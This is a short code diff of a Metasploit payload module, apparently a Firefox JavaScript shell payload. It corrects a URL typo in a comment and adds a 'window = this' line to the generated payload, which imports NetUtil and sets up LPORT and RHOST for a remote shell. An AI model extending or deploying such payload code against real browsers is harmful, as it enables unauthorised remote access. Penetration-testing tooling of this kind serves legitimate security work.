@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -34,6 +34,7 @@ module Metasploit3
   def generate
     %Q|
     (function(){
+      window = this;
       Components.utils.import("resource://gre/modules/NetUtil.jsm");
       var lport = #{datastore["LPORT"]};
       var rhost = "#{datastore['RHOST']}";
